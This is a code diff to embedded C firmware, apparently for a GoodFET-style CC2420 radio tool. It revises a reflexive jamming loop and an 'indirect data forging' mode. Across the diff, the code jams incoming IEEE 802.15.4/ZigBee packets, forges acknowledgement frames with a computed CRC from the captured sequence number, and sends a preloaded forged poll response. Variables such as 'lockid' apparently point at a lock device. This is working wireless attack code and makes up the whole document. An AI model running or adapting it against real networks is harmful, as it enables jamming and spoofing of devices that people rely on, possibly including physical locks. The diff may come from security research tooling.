@@ -97,9 +97,7 @@ void ccspireflexjam(u16 delay){
   prep_timer();
   debugstr("Reflex jamming until reset.");
   debughex(delay);
-  debugstr("@mknight!");
-//  txdata(CCSPI,CCSPI_REFLEX,1);  //Let the client continue its business.
-  debugstr("@mknight ready!");
+  txdata(CCSPI,CCSPI_REFLEX,1);  //Let the client continue its business.
   while(1) {
     //Wait until a packet is received
     while(!SFD){
@@ -144,9 +142,7 @@ void ccspireflexjam(u16 delay){
     CLRSS;
     ccspitrans8(0x09); //SFLUSHTX
     SETSS;
-    
-    debugstr("@mknight jammed");
-    
+     
     //Turn off LED 2 (green) as signal
     PLED2DIR |= PLED2PIN;
     PLED2OUT |= PLED2PIN;
@@ -534,13 +530,17 @@ void ccspi_handle_fn( uint8_t const app,
 
   case CCSPI_REFLEX_INDIRECT:
 #if defined(FIFOP) && defined(SFD) && defined(FIFO) && defined(PLED2DIR) && defined(PLED2PIN) && defined(PLED2OUT)
-    debugstr("Indirect");
+    debugstr("Indirect data forging until reset.");
+    debugstr("Preloaded response:");
+    for(i=0;i<cmddata[0]+1;i++) {
+        itoa(cmddata[i], byte, 16);
+        debugstr(byte);
+    }
 //    txdata(app, verb, len);
-    char seqnum;
-    char panid[2];
-    char lockid[2];
-    char coordid[2];
     while(1) {
+        #define INDBUFLEN 10
+        char pktbuf[INDBUFLEN];
+        char rxfcf0;
         //Has there been an overflow in the RX buffer?
         if((!FIFO)&&FIFOP){
           //debugstr("Clearing overflow");
@@ -548,6 +548,15 @@ void ccspi_handle_fn( uint8_t const app,
           ccspitrans8(0x08); //SFLUSHRX
           SETSS;
         }
+
+        //Preload jamming sequence
+        pktbuf[0] = 0x07;
+        pktbuf[1] = 0x01;
+        pktbuf[2] = 0x08;
+        pktbuf[3] = 0xff;
+        pktbuf[4] = 0xff;
+        pktbuf[5] = 0xff;
+        pktbuf[6] = 0xff;
 
         //Wait until a packet is received
         while(!SFD);
@@ -565,9 +574,8 @@ void ccspi_handle_fn( uint8_t const app,
         //Load the jamming packet
         CLRSS;
         ccspitrans8(CCSPI_TXFIFO);
-        char pkt[7] = {0x07, 0x01, 0x08, 0xff, 0xff, 0xff, 0xff};
-        for(i=0;i<pkt[0];i++)
-          ccspitrans8(pkt[i]);
+        for(i=0;i<pktbuf[0];i++)
+          ccspitrans8(pktbuf[i]);
         SETSS;
         //Transmit the jamming packet
         CLRSS;
@@ -585,35 +593,38 @@ void ccspi_handle_fn( uint8_t const app,
         //Get the beginning of the jammed packet -- seqnum required to forge ACK
         CLRSS;
         ccspitrans8(CCSPI_RXFIFO | 0x40);
-        for(i=0;i<4;i++)
-            cmddata[i]=ccspitrans8(0xde);
+        for(i=0;(i<4) && (i<INDBUFLEN);i++)  // MAGIC seqnum is byte 4/index 3 in RXFIFO
+            pktbuf[i]=ccspitrans8(0xde);
         SETSS;
         //Flush RX buffer.
         CLRSS;
         ccspitrans8(0x08);  //SFLUSHRX
         SETSS;
 
+        //save part of FCF, later will use 0x1X frame pending flag to determine whether to send
+        rxfcf0 = pktbuf[1];
+
         //Create the forged ACK packet
-        cmddata[0] = 5;     //length of ack frame, omitting length
-        cmddata[1] = 0x12;  //first byte of FCF -- 0x1X is frame pending flag
-        cmddata[2] = 0x00;  //second byte of FCF
+        pktbuf[0] = 5;     //length of ack frame, omitting length
+        pktbuf[1] = 0x12;  //first byte of FCF -- 0x1X is frame pending flag
+        pktbuf[2] = 0x00;  //second byte of FCF
         //[3] is already filled with the sequence number
         long crc = 0;
         for(i=1;i<4;i++) {
-            char c = cmddata[i];
+            char c = pktbuf[i];
             long q = (crc ^ c) & 0x0f;
             crc = (crc >> 4) ^ (q * 0x1081);
             q = (crc ^ (c >> 4)) & 0xf;
             crc = (crc >> 4) ^ (q * 0x1081);
         }
-        cmddata[4] = crc & 0xFF;
-        cmddata[5] = (crc >> 8) & 0xFF;
+        pktbuf[4] = crc & 0xFF;
+        pktbuf[5] = (crc >> 8) & 0xFF;
 
         //Load the forged ACK packet
         CLRSS;
         ccspitrans8(CCSPI_TXFIFO);
-        for(i=0;i<cmddata[0]+4;i++)      // Send extras
-          ccspitrans8(cmddata[i]);
+        for(i=0;(i<pktbuf[0]+4) && (i<INDBUFLEN);i++)      // Send extras
+          ccspitrans8(pktbuf[i]);
         SETSS;
         //Transmit the forged ACK packet
         while(SFD);
@@ -633,58 +644,7 @@ void ccspi_handle_fn( uint8_t const app,
 	PLEDDIR |= PLEDPIN;
 	PLEDOUT &= ~PLEDPIN;
 
-        // Forge an indirect poll response packet
-        cmddata[0] = 48;          // length
-        cmddata[1] = 0x61;        // fcs1
-        cmddata[2] = 0x88;        // fcs0
-        cmddata[3] = 0xab;        // sequence number
-        cmddata[4] = 0xab;
-        cmddata[5] = 0x3e;
-        cmddata[6] = 0xbe;
-        cmddata[7] = 0xbc;
-        cmddata[8] = 0x00;
-        cmddata[9] = 0x00;
-        cmddata[10] = 0x48;       // zigbee frame header
-        cmddata[11] = 0x02;
-        cmddata[12] = 0xbe;
-        cmddata[13] = 0xbc;
-        cmddata[14] = 0x00;
-        cmddata[15] = 0x00;
-        cmddata[16] = 0x1e;
-        cmddata[17] = 0xdb;
-        cmddata[18] = 0x28;
-        cmddata[19] = 0x6f;
-        cmddata[20] = 0x40;
-        cmddata[21] = 0x02;
-        cmddata[22] = 0x00;
-        cmddata[23] = 0x01;
-        cmddata[24] = 0x00;
-        cmddata[25] = 0xb8;
-        cmddata[26] = 0x13;
-        cmddata[27] = 0x17;
-        cmddata[28] = 0xa8;
-        cmddata[29] = 0x52;
-        cmddata[30] = 0xd0;
-        cmddata[31] = 0x00;
-        cmddata[32] = 0x72;
-        cmddata[33] = 0x31;
-        cmddata[34] = 0x8b;
-        cmddata[35] = 0xc5;
-        cmddata[36] = 0xce;
-        cmddata[37] = 0x54;
-        cmddata[38] = 0xfb;
-        cmddata[39] = 0x33;
-        cmddata[40] = 0x33;
-        cmddata[41] = 0xd9;
-        cmddata[42] = 0xa9;
-        cmddata[43] = 0x67;
-        cmddata[44] = 0x0f;
-        cmddata[45] = 0x3f;
-        cmddata[46] = 0xc2;
-        cmddata[47] = 0x38;
-        cmddata[48] = 0x8e;
-
-        //msdelay(1000);       //TODO try doing this based on SFD line status instead
+        //msdelay(1000);
 
         //Load the forged indirect response packet
         CLRSS;
@@ -703,16 +663,6 @@ void ccspi_handle_fn( uint8_t const app,
         ccspitrans8(0x09);  //SFLUSHTX
         SETSS;
 
-        //TODO disable AUTOCRC here again to go back to promiscous mode
-
-        debugbytes(panid, 2);
-        debugbytes(coordid, 2);
-        debugbytes(lockid, 2);
-        for(i=0;i<cmddata[0]+1;i++) {
-            itoa(cmddata[i], byte, 16);
-            debugstr(byte);
-        }
-
         //Turn off LED 2 (green) as signal
 	PLED2DIR |= PLED2PIN;
 	PLED2OUT |= PLED2PIN;
@@ -720,7 +670,6 @@ void ccspi_handle_fn( uint8_t const app,
 	PLEDDIR |= PLEDPIN;
 	PLEDOUT |= PLEDPIN;
     }
-    //TODO the firmware stops staying in this mode after a while, and stops jamming... need to find a fix.
 #else
     debugstr("Can't reflexively jam without SFD, FIFO, FIFOP, and P2LEDx definitions - try using telosb platform.");
     txdata(app,NOK,0);
